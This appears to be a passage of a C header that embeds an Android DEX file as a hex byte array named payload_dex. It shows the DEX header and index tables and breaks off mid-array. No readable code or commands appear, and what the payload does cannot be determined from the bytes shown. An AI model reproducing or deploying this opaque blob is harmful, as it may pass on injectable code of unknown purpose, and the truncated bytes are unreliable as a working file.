#pragma once

const unsigned char payload_dex[] = {
    0x64, 0x65, 0x78, 0x0a, 0x30, 0x33, 0x38, 0x00, 0xb7, 0x8e, 0x7b, 0xef, 0x29, 0x78, 0xab, 0x27, 
    0x95, 0xe2, 0x70, 0x49, 0xf9, 0x9d, 0x75, 0x59, 0xf8, 0x3b, 0xc2, 0xc1, 0xe6, 0xed, 0xff, 0x4c, 
    0xdc, 0x5e, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x78, 0x56, 0x34, 0x12, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x0c, 0x5e, 0x00, 0x00, 0xaf, 0x01, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 
    0x63, 0x00, 0x00, 0x00, 0x2c, 0x07, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0xb8, 0x08, 0x00, 0x00, 
    0x4c, 0x00, 0x00, 0x00, 0x80, 0x0d, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00, 0xe0, 0x0f, 0x00, 0x00, 
    0x16, 0x00, 0x00, 0x00, 0x20, 0x17, 0x00, 0x00, 0xfc, 0x44, 0x00, 0x00, 0xe0, 0x19, 0x00, 0x00, 
    0x60, 0x3a, 0x00, 0x00, 0x62, 0x3a, 0x00, 0x00, 0x67, 0x3a, 0x00, 0x00, 0x6d, 0x3a, 0x00, 0x00, 
    0x72, 0x3a, 0x00, 0x00, 0x77, 0x3a, 0x00, 0x00, 0x7c, 0x3a, 0x00, 0x00, 0x81, 0x3a, 0x00, 0x00, 
    0x98, 0x3a, 0x00, 0x00, 0xad, 0x3a, 0x00, 0x00, 0xc8, 0x3a, 0x00, 0x00, 0xe9, 0x3a, 0x00, 0x00, 
    0x05, 0x3b, 0x00, 0x00, 0x21, 0x3b, 0x00, 0x00, 0x42, 0x3b, 0x00, 0x00, 0x63, 0x3b, 0x00, 0x00, 
    0x7f, 0x3b, 0x00, 0x00, 0x91, 0x3b, 0x00, 0x00, 0xa3, 0x3b, 0x00, 0x00, 0xc3, 0x3b, 0x00, 0x00, 
    0xd8, 0x3b, 0x00, 0x00, 0xf7, 0x3b, 0x00, 0x00, 0x15, 0x3c, 0x00, 0x00, 0x1b, 0x3c, 0x00, 0x00, 
    0x25, 0x3c, 0x00, 0x00, 0x2d, 0x3c, 0x00, 0x00, 0x30, 0x3c, 0x00, 0x00, 0x3e, 0x3c, 0x00, 0x00, 
    0x4c, 0x3c, 0x00, 0x00, 0x5b, 0x3c, 0x00, 0x00, 0x69, 0x3c, 0x00, 0x00, 0x7e, 0x3c, 0x00, 0x00, 
    0x8c, 0x3c, 0x00, 0x00, 0x9e, 0x3c, 0x00, 0x00, 0xab, 0x3c, 0x00, 0x00, 0xb7, 0x3c, 0x00, 0x00, 
    0xbf, 0x3c, 0x00, 0x00, 0xc8, 0x3c, 0x00, 0x00, 0xcb, 0x3c, 0x00, 0x00, 0xcf, 0x3c, 0x00, 0x00, 
    0xe2, 0x3c, 0x00, 0x00, 0xe5, 0x3c, 0x00, 0x00, 0xe9, 0x3c, 0x00, 0x00, 0xee, 0x3c, 0x00, 0x00, 
    0xf2, 0x3c, 0x00, 0x00, 0xf8, 0x3c, 0x00, 0x00, 0xfd, 0x3c, 0x00, 0x00, 0x03, 0x3d, 0x00, 0x00, 
    0x12, 0x3d, 0x00, 0x00, 0x16, 0x3d, 0x00, 0x00, 0x2a, 0x3d, 0x00, 0x00, 0x43, 0x3d, 0x00, 0x00, 
    0x46, 0x3d, 0x00, 0x00, 0x49, 0x3d, 0x00, 0x00, 0x4e, 0x3d, 0x00, 0x00, 0x52, 0x3d, 0x00, 0x00, 
    0x56, 0x3d, 0x00, 0x00, 0x5d, 0x3d, 0x00, 0x00, 0x62, 0x3d, 0x00, 0x00, 0x66, 0x3d, 0x00, 0x00, 
    0x6b, 0x3d, 0x00, 0x00, 0x70, 0x3d, 0x00, 0x00, 0x74, 0x3d, 0x00, 0x00, 0x8c, 0x3d, 0x00, 0x00, 
    0xc2, 0x3d, 0x00, 0x00, 0xdd, 0x3d, 0x00, 0x00, 0xf8, 0x3d, 0x00, 0x00, 0x19, 0x3e, 0x00, 0x00, 
    0x36, 0x3e, 0x00, 0x00, 0x5c, 0x3e, 0x00, 0x00, 0x8a, 0x3e, 0x00, 0x00, 0xb3, 0x3e, 0x00, 0x00, 
    0xd3, 0x3e, 0x00, 0x00, 0xef, 0x3e, 0x00, 0x00, 0x04, 0x3f, 0x00, 0x00, 0x1a, 0x3f, 0x00, 0x00, 
    0x30, 0x3f, 0x00, 0x00, 0x45, 0x3f, 0x00, 0x00, 0x5e, 0x3f, 0x00, 0x00, 0x7d, 0x3f, 0x00, 0x00, 
    0x91, 0x3f, 0x00, 0x00, 0xaa, 0x3f, 0x00, 0x00, 0xc6, 0x3f, 0x00, 0x00, 0xde, 0x3f, 0x00, 0x00, 
    0xfc, 0x3f, 0x00, 0x00, 0x21, 0x40, 0x00, 0x00, 0x44, 0x40, 0x00, 0x00, 0x69, 0x40, 0x00, 0x00, 
    0x7e, 0x40, 0x00, 0x00, 0xa5, 0x40, 0x00, 0x00, 0xc0, 0x40, 0x00, 0x00, 0xd7, 0x40, 0x00, 0x00, 
    0x02, 0x41, 0x00, 0x00, 0x20, 0x41, 0x00, 0x00, 0x4f, 0x41, 0x00, 0x00, 0x6a, 0x41, 0x00, 0x00, 
    0x96, 0x41, 0x00, 0x00, 0xb5, 0x41, 0x00, 0x00, 0xe7, 0x41, 0x00, 0x00, 0x02, 0x42, 0x00, 0x00, 
    0x2c, 0x42, 0x00, 0x00, 0x5e, 0x42, 0x00, 0x00, 0x90, 0x42, 0x00, 0x00, 0xc2, 0x42, 0x00, 0x00, 
    0xf4, 0x42, 0x00, 0x00, 0x26, 0x43, 0x00, 0x00, 0x56, 0x43, 0x00, 0x00, 0x7e, 0x43, 0x00, 0x00, 
    0xa6, 0x43, 0x00, 0x00, 0xcc, 0x43, 0x00, 0x00, 0xf0, 0x43, 0x00, 0x00, 0x1b, 0x44, 0x00, 0x00, 
    0x46, 0x44, 0x00, 0x00, 0x6f, 0x44, 0x00, 0x00, 0x94, 0x44, 0x00, 0x00, 0xbc, 0x44, 0x00, 0x00, 
    0xe2, 0x44, 0x00, 0x00, 0x08, 0x45, 0x00, 0x00, 0x2e, 0x45, 0x00, 0x00, 0x53, 0x45, 0x00, 0x00, 
    0x76, 0x45, 0x00, 0x00, 0x95, 0x45, 0x00, 0x00, 0xb9, 0x45, 0x00, 0x00, 0xde, 0x45, 0x00, 0x00, 
    0xfe, 0x45, 0x00, 0x00, 0x21, 0x46, 0x00, 0x00, 0x47, 0x46, 0x00, 0x00, 0x66, 0x46, 0x00, 0x00, 
    0x80, 0x46, 0x00, 0x00, 0x93, 0x46, 0x00, 0x00, 0xa6, 0x46, 0x00, 0x00, 0xbb, 0x46, 0x00, 0x00, 
    0xdd, 0x46, 0x00, 0x00, 0xef, 0x46, 0x00, 0x00, 0x12, 0x47, 0x00, 0x00, 0x26, 0x47, 0x00, 0x00, 
    0x50, 0x47, 0x00, 0x00, 0x66, 0x47, 0x00, 0x00, 0x84, 0x47, 0x00, 0x00, 0x98, 0x47, 0x00, 0x00, 
    0xb3, 0x47, 0x00, 0x00, 0xc7, 0x47, 0x00, 0x00, 0xde, 0x47, 0x00, 0x00, 0xf9, 0x47, 0x00, 0x00, 
    0x15, 0x48, 0x00, 0x00, 0x2d, 0x48, 0x00, 0x00, 0x43, 0x48, 0x00, 0x00, 0x54, 0x48, 0x00, 0x00, 
    0x80, 0x48, 0x00, 0x00, 0xac, 0x48, 0x00, 0x00, 0xb9, 0x48, 0x00, 0x00, 0xcc, 0x48, 0x00, 0x00, 
    0xdd, 0x48, 0x00, 0x00, 0xe8, 0x48, 0x00, 0x00, 0xfa, 0x48, 0x00, 0x00, 0x07, 0x49, 0x00, 0x00, 
    0x19, 0x49, 0x00, 0x00, 0x1d, 0x49, 0x00, 0x00, 0x24, 0x49, 0x00, 0x00, 0x2c, 0x49, 0x00, 0x00, 
    0x35, 0x49, 0x00, 0x00, 0x3c, 0x49, 0x00, 0x00, 0x42, 0x49, 0x00, 0x00, 0x47, 0x49, 0x00, 0x00, 
    0x59, 0x49, 0x00, 0x00, 0x5f, 0x49, 0x00, 0x00, 0x62, 0x49, 0x00, 0x00, 0x66, 0x49, 0x00, 0x00, 
    0x6a, 0x49, 0x00, 0x00, 0x6f, 0x49, 0x00, 0x00, 0x75, 0x49, 0x00, 0x00, 0x7c, 0x49, 0x00, 0x00, 
    0x84, 0x49, 0x00, 0x00, 0x8d, 0x49, 0x00, 0x00, 0x93, 0x49, 0x00, 0x00, 0x97, 0x49, 0x00, 0x00, 
    0x9b, 0x49, 0x00, 0x00, 0xa0, 0x49, 0x00, 0x00, 0xa5, 0x49, 0x00, 0x00, 0xab, 0x49, 0x00, 0x00, 
    0xb0, 0x49, 0x00, 0x00, 0xb4, 0x49, 0x00, 0x00, 0xba, 0x49, 0x00, 0x00, 0xbd, 0x49, 0x00, 0x00, 
    0xc1, 0x49, 0x00, 0x00, 0xc6, 0x49, 0x00, 0x00, 0xcc, 0x49, 0x00, 0x00, 0xd1, 0x49, 0x00, 0x00, 
    0xd6, 0x49, 0x00, 0x00, 0xda, 0x49, 0x00, 0x00, 0xf0, 0x49, 0x00, 0x00, 0x1c, 0x4a, 0x00, 0x00, 
    0x30, 0x4a, 0x00, 0x00, 0x45, 0x4a, 0x00, 0x00, 0x5a, 0x4a, 0x00, 0x00, 0x5e, 0x4a, 0x00, 0x00, 
    0x6b, 0x4a, 0x00, 0x00, 0x7f, 0x4a, 0x00, 0x00, 0x89, 0x4a, 0x00, 0x00, 0x93, 0x4a, 0x00, 0x00, 
    0xa2, 0x4a, 0x00, 0x00, 0xab, 0x4a, 0x00, 0x00, 0xc7, 0x4a, 0x00, 0x00, 0xd1, 0x4a, 0x00, 0x00, 
    0xd9, 0x4a, 0x00, 0x00, 0xed, 0x4a, 0x00, 0x00, 0xf5, 0x4a, 0x00, 0x00, 0x03, 0x4b, 0x00, 0x00, 
    0x0a, 0x4b, 0x00, 0x00, 0x12, 0x4b, 0x00, 0x00, 0x26, 0x4b, 0x00, 0x00, 0x2d, 0x4b, 0x00, 0x00, 
    0x35, 0x4b, 0x00, 0x00, 0x49, 0x4b, 0x00, 0x00, 0x5d, 0x4b, 0x00, 0x00, 0x71, 0x4b, 0x00, 0x00, 
    0x7f, 0x4b, 0x00, 0x00, 0x90, 0x4b, 0x00, 0x00, 0xa4, 0x4b, 0x00, 0x00, 0xb1, 0x4b, 0x00, 0x00, 
    0xc5, 0x4b, 0x00, 0x00, 0xe3, 0x4b, 0x00, 0x00, 0xfa, 0x4b, 0x00, 0x00, 0x0e, 0x4c, 0x00, 0x00, 
    0x1d, 0x4c, 0x00, 0x00, 0x34, 0x4c, 0x00, 0x00, 0x3d, 0x4c, 0x00, 0x00, 0x4b, 0x4c, 0x00, 0x00, 
    0x5d, 0x4c, 0x00, 0x00, 0x61, 0x4c, 0x00, 0x00, 0x6b, 0x4c, 0x00, 0x00, 0x73, 0x4c, 0x00, 0x00, 
    0x7b, 0x4c, 0x00, 0x00, 0x95, 0x4c, 0x00, 0x00, 0xa7, 0x4c, 0x00, 0x00, 0xbd, 0x4c, 0x00, 0x00, 
    0xc4, 0x4c, 0x00, 0x00, 0xcd, 0x4c, 0x00, 0x00, 0xd2, 0x4c, 0x00, 0x00, 0xdd, 0x4c, 0x00, 0x00, 
    0xee, 0x4c, 0x00, 0x00, 0xfe, 0x4c, 0x00, 0x00, 0x19, 0x4d, 0x00, 0x00, 0x28, 0x4d, 0x00, 0x00, 
    0x34, 0x4d, 0x00, 0x00, 0x3e, 0x4d, 0x00, 0x00, 0x50, 0x4d, 0x00, 0x00, 0x5e, 0x4d, 0x00, 0x00, 
    0x71, 0x4d, 0x00, 0x00, 0x88, 0x4d, 0x00, 0x00, 0x9d, 0x4d, 0x00, 0x00, 0xa8, 0x4d, 0x00, 0x00, 
    0xb4, 0x4d, 0x00, 0x00, 0xc6, 0x4d, 0x00, 0x00, 0xd5, 0x4d, 0x00, 0x00, 0xe0, 0x4d, 0x00, 0x00, 
    0xe9, 0x4d, 0x00, 0x00, 0xf4, 0x4d, 0x00, 0x00, 0x02, 0x4e, 0x00, 0x00, 0x0e, 0x4e, 0x00, 0x00, 
    0x20, 0x4e, 0x00, 0x00, 0x29, 0x4e, 0x00, 0x00, 0x34, 0x4e, 0x00, 0x00, 0x43, 0x4e, 0x00, 0x00, 
    0x53, 0x4e, 0x00, 0x00, 0x59, 0x4e, 0x00, 0x00, 0x5f, 0x4e, 0x00, 0x00, 0x68, 0x4e, 0x00, 0x00, 
    0x71, 0x4e, 0x00, 0x00, 0x79, 0x4e, 0x00, 0x00, 0x87, 0x4e, 0x00, 0x00, 0xa0, 0x4e, 0x00, 0x00, 
    0xa3, 0x4e, 0x00, 0x00, 0xb0, 0x4e, 0x00, 0x00, 0xc8, 0x4e, 0x00, 0x00, 0xe0, 0x4e, 0x00, 0x00, 
    0xf3, 0x4e, 0x00, 0x00, 0x01, 0x4f, 0x00, 0x00, 0x10, 0x4f, 0x00, 0x00, 0x1b, 0x4f, 0x00, 0x00, 
    0x29, 0x4f, 0x00, 0x00, 0x34, 0x4f, 0x00, 0x00, 0x3c, 0x4f, 0x00, 0x00, 0x45, 0x4f, 0x00, 0x00, 
    0x50, 0x4f, 0x00, 0x00, 0x5f, 0x4f, 0x00, 0x00, 0x69, 0x4f, 0x00, 0x00, 0x77, 0x4f, 0x00, 0x00, 
    0x85, 0x4f, 0x00, 0x00, 0x93, 0x4f, 0x00, 0x00, 0xa1, 0x4f, 0x00, 0x00, 0xa9, 0x4f, 0x00, 0x00, 
    0xc4, 0x4f, 0x00, 0x00, 0xcc, 0x4f, 0x00, 0x00, 0xd9, 0x4f, 0x00, 0x00, 0xe4, 0x4f, 0x00, 0x00, 
    0xea, 0x4f, 0x00, 0x00, 0xff, 0x4f, 0x00, 0x00, 0x14, 0x50, 0x00, 0x00, 0x19, 0x50, 0x00, 0x00, 
    0x21, 0x50, 0x00, 0x00, 0x27, 0x50, 0x00, 0x00, 0x39, 0x50, 0x00, 0x00, 0x3f, 0x50, 0x00, 0x00, 
    0x46, 0x50, 0x00, 0x00, 0x5b, 0x50, 0x00, 0x00, 0x61, 0x50, 0x00, 0x00, 0x74, 0x50, 0x00, 0x00, 
    0x89, 0x50, 0x00, 0x00, 0x9b, 0x50, 0x00, 0x00, 0xae, 0x50, 0x00, 0x00, 0xcb, 0x50, 0x00, 0x00, 
    0xde, 0x50, 0x00, 0x00, 0xf1, 0x50, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x09, 0x51, 0x00, 0x00, 
    0x1f, 0x51, 0x00, 0x00, 0x2c, 0x51, 0x00, 0x00, 0x3c, 0x51, 0x00, 0x00, 0x43, 0x51, 0x00, 0x00, 
    0x4c, 0x51, 0x00, 0x00, 0x56, 0x51, 0x00, 0x00, 0x68, 0x51, 0x00, 0x00, 0x7a, 0x51, 0x00, 0x00, 
    0x83, 0x51, 0x00, 0x00, 0xa7, 0x51, 0x00, 0x00, 0xae, 0x51, 0x00, 0x00, 0xba, 0x51, 0x00, 0x00, 
    0xc4, 0x51, 0x00, 0x00, 0xcc, 0x51, 0x00, 0x00, 0xd2, 0x51, 0x00, 0x00, 0xdf, 0x51, 0x00, 0x00, 
    0xeb, 0x51, 0x00, 0x00, 0xf7, 0x51, 0x00, 0x00, 0x03, 0x52, 0x00, 0x00, 0x27, 0x52, 0x00, 0x00, 
    0x38, 0x52, 0x00, 0x00, 0x4c, 0x52, 0x00, 0x00, 0x61, 0x52, 0x00, 0x00, 0x74, 0x52, 0x00, 0x00, 
    0x7d, 0x52, 0x00, 0x00, 0x8b, 0x52, 0x00, 0x00, 0x9a, 0x52, 0x00, 0x00, 0xb1, 0x52, 0x00, 0x00, 
    0xcb, 0x52, 0x00, 0x00, 0xd2, 0x52, 0x00, 0x00, 0xd7, 0x52, 0x00, 0x00, 0xe6, 0x52, 0x00, 0x00, 
    0xf2, 0x52, 0x00, 0x00, 0x01, 0x53, 0x00, 0x00, 0x15, 0x53, 0x00, 0x00, 0x23, 0x53, 0x00, 0x00, 
    0x2d, 0x53, 0x00, 0x00, 0x3e, 0x53, 0x00, 0x00, 0x53, 0x53, 0x00, 0x00, 0x6f, 0x53, 0x00, 0x00, 
    0x7d, 0x53, 0x00, 0x00, 0x8b, 0x53, 0x00, 0x00, 0x96, 0x53, 0x00, 0x00, 0xa2, 0x53, 0x00, 0x00, 
    0xb4, 0x53, 0x00, 0x00, 0xc3, 0x53, 0x00, 0x00, 0xd1, 0x53, 0x00, 0x00, 0xdf, 0x53, 0x00, 0x00, 
    0xf3, 0x53, 0x00, 0x00, 0x0e, 0x54, 0x00, 0x00, 0x20, 0x54, 0x00, 0x00, 0x34, 0x54, 0x00, 0x00, 
    0x44, 0x54, 0x00, 0x00, 0x50, 0x54, 0x00, 0x00, 0x5f, 0x54, 0x00, 0x00, 0x6c, 0x54, 0x00, 0x00, 
    0x81, 0x54, 0x00, 0x00, 0x8f, 0x54, 0x00, 0x00, 0x9e, 0x54, 0x00, 0x00, 0xa9, 0x54, 0x00, 0x00, 
    0xb2, 0x54, 0x00, 0x00, 0xc0, 0x54, 0x00, 0x00, 0xcd, 0x54, 0x00, 0x00, 0xda, 0x54, 0x00, 0x00, 
    0xe9, 0x54, 0x00, 0x00, 0xf9, 0x54, 0x00, 0x00, 0x05, 0x55, 0x00, 0x00, 0x14, 0x55, 0x00, 0x00, 
    0x1b, 0x55, 0x00, 0x00, 0x2a, 0x55, 0x00, 0x00, 0x31, 0x55, 0x00, 0x00, 0x38, 0x55, 0x00, 0x00, 
    0x4b, 0x55, 0x00, 0x00, 0x54, 0x55, 0x00, 0x00, 0x61, 0x55, 0x00, 0x00, 0x67, 0x55, 0x00, 0x00, 
    0x6f, 0x55, 0x00, 0x00, 0x76, 0x55, 0x00, 0x00, 0x80, 0x55, 0x00, 0x00, 0x8a, 0x55, 0x00, 0x00, 
    0x92, 0x55, 0x00, 0x00, 0x9c, 0x55, 0x00, 0x00, 0xa3, 0x55, 0x00, 0x00, 0xae, 0x55, 0x00, 0x00, 
    0xc1, 0x55, 0x00, 0x00, 0xd2, 0x55, 0x00, 0x00, 0xf8, 0x55, 0x00, 0x00, 0x11, 0x56, 0x00, 0x00, 
    0x25, 0x56, 0x00, 0x00, 0x33, 0x56, 0x00, 0x00, 0x47, 0x56, 0x00, 0x00, 0x56, 0x56, 0x00, 0x00, 
    0x65, 0x56, 0x00, 0x00, 0x73, 0x56, 0x00, 0x00, 0x7b, 0x56, 0x00, 0x00, 0x87, 0x56, 0x00, 0x00, 
    0x9c, 0x56, 0x00, 0x00, 0xae, 0x56, 0x00, 0x00, 0xbb, 0x56, 0x00, 0x00, 0xc8, 0x56, 0x00, 0x00, 
    0xd3, 0x56, 0x00, 0x00, 0xe2, 0x56, 0x00, 0x00, 0xe9, 0x56, 0x00, 0x00, 0xf1, 0x56, 0x00, 0x00, 
    0xf4, 0x56, 0x00, 0x00, 0x08, 0x57, 0x00, 0x00, 0x0f, 0x57, 0x00, 0x00, 0x16, 0x57, 0x00, 0x00, 
    0x23, 0x57, 0x00, 0x00, 0x2b, 0x57, 0x00, 0x00, 0x3a, 0x57, 0x00, 0x00, 0x4c, 0x57, 0x00, 0x00, 
    0x4f, 0x57, 0x00, 0x00, 0x54, 0x57, 0x00, 0x00, 0x57, 0x57, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 
    0x25, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x33, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 
    0x3f, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 
    0x43, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 
    0x47, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x49, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x00, 0x00, 
    0x4b, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x4d, 0x00, 0x00, 0x00, 0x4e, 0x00, 0x00, 0x00, 
    0x4f, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 0x52, 0x00, 0x00, 0x00, 
    0x53, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 
    0x57, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 0x5a, 0x00, 0x00, 0x00, 
    0x5b, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x00, 0x00, 0x5d, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 
    0x5f, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x61, 0x00, 0x00, 0x00, 0x62, 0x00, 0x00, 0x00, 
    0x63, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x65, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 
    0x67, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 
    0x6b, 0x00, 0x00, 0x00, 0x6c, 0x00, 0x00, 0x00, 0x6d, 0x00, 0x00, 0x00, 0x6e, 0x00, 0x00, 0x00, 
    0x6f, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x71, 0x00, 0x00, 0x00, 0x72, 0x00, 0x00, 0x00, 
    0x73, 0x00, 0x00, 0x00, 0x74, 0x00, 0x00, 0x00, 0x75, 0x00, 0x00, 0x00, 0x76, 0x00, 0x00, 0x00, 
    0x77, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x7a, 0x00, 0x00, 0x00, 
    0x7b, 0x00, 0x00, 0x00, 0x7c, 0x00, 0x00, 0x00, 0x7d, 0x00, 0x00, 0x00, 0x7e, 0x00, 0x00, 0x00, 
    0x7f, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x81, 0x00, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 
    0x83, 0x00, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x85, 0x00, 0x00, 0x00, 0x86, 0x00, 0x00, 0x00, 
    0x87, 0x00, 0x00, 0x00, 0x88, 0x00, 0x00, 0x00, 0x89, 0x00, 0x00, 0x00, 0x8a, 0x00, 0x00, 0x00, 
    0x8b, 0x00, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x8d, 0x00, 0x00, 0x00, 0x8e, 0x00, 0x00, 0x00, 
    0x8f, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x92, 0x00, 0x00, 0x00, 
    0x93, 0x00, 0x00, 0x00, 0x94, 0x00, 0x00, 0x00, 0xa5, 0x00, 0x00, 0x00, 0xb6, 0x00, 0x00, 0x00, 
    0xbc, 0x00, 0x00, 0x00, 0xbd, 0x00, 0x00, 0x00, 0xbe, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 
    0xc0, 0x00, 0x00, 0x00, 0xc1, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x26, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xa8, 0x38, 0x00, 0x00, 
    0x28, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0xb0, 0x38, 0x00, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0xb8, 0x38, 0x00, 0x00, 0x2b, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xa8, 0x38, 0x00, 0x00, 
    0x2d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xc0, 0x38, 0x00, 0x00, 0x2e, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0xc8, 0x38, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0xd4, 0x38, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xdc, 0x38, 0x00, 0x00, 
    0x34, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 
    0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x38, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xe8, 0x38, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x34, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 
    0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x34, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x39, 0x00, 0x00, 0x00, 
    0x1d, 0x00, 0x00, 0x00, 0xf4, 0x38, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x1f, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x34, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 
    0x21, 0x00, 0x00, 0x00, 0xfc, 0x38, 0x00, 0x00, 0x3d, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 
    0xd4, 0x38, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x34, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x39, 0x00, 0x00, 0x00, 
    0x24, 0x00, 0x00, 0x00, 0x04, 0x39, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x26, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x3b, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x0c, 0x39, 0x00, 0x00, 
    0x34, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3a, 0x00, 0x00, 0x00, 
    0x46, 0x00, 0x00, 0x00, 0xa8, 0x38, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x3a, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x14, 0x39, 0x00, 0x00, 
    0x3c, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x1c, 0x39, 0x00, 0x00, 0x3a, 0x00, 0x00, 0x00, 
    0x4c, 0x00, 0x00, 0x00, 0xa8, 0x38, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x24, 0x39, 0x00, 0x00, 
    0x36, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 0xb0, 0x38, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 
    0x51, 0x00, 0x00, 0x00, 0xfc, 0x38, 0x00, 0x00, 0x3a, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 
    0xa8, 0x38, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x3a, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0xa8, 0x38, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x00, 
    0x55, 0x00, 0x00, 0x00, 0x2c, 0x39, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 
